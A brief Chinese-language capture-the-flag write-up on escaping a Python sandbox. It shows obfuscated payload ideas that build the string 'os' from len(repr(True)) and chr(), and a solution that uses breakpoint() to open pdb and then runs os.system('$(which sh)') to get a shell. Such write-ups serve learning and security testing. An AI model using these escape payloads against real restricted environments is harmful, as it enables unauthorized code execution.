感觉这题简单的让我懵逼，没想到是这个东西，原本一直在绕

还写了一点hint.txt

```
大概可以绕过的思路
print
构造数字 len(repr(True))
目测的payload
构造os o=111=4*4*4+4*4*2+4*4*1-1 s=115
这里构造的为字符串
exec(ls)

print((chr(len(repr(True))*len(repr(True))*(len(repr(True))+True+True+True)-True)+chr(len(repr(True))*len(repr(True))*(len(repr(True))+True+True+True)-True+len(repr(True))))[::-True])
```

最后发现可以用breakpoint()

pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。

在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码

然后即可执行import os;os.system("$(which sh)"即可拿到shell权限即可获取flag